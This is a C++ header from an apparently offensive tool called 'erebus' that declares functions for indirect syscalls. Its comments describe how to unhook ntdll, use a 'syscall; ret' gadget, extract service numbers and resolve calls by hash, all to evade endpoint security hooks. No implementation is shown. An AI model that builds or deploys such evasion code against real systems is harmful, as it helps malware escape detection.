#ifndef EREBUS_EVASION_SYSCALLS_HPP
#define EREBUS_EVASION_SYSCALLS_HPP
#pragma once

#include <windows.h>

namespace erebus {
namespace evasion {

    // One-time setup: locate a `syscall; ret` gadget inside the (ideally
    // already-unhooked) ntdll .text, extract system service numbers for
    // the Nt* functions we plan to call indirectly, and plant per-syscall
    // shims into an RX page. Call once after UnhookNtdll().
    //
    // Returns FALSE if the gadget could not be found or shim allocation
    // failed; callers should fall back to hashed-import calls.
    BOOL InitIndirectSyscalls();

    // Resolve a per-syscall trampoline by function-name hash. The returned
    // pointer can be cast to the native Nt* signature and called like any
    // normal function pointer - the shim sets RAX=SSN, r10=rcx, and jumps
    // to the in-ntdll `syscall; ret` gadget. Caller args are passed through
    // unchanged because the shim does not touch rdx / r8 / r9 / stack.
    //
    // Returns NULL if InitIndirectSyscalls() was not called, the syscall
    // was not registered, or SSN extraction failed for that function.
    PVOID GetIndirectSyscall(ULONG funcHash);

} // namespace evasion
} // namespace erebus

#endif
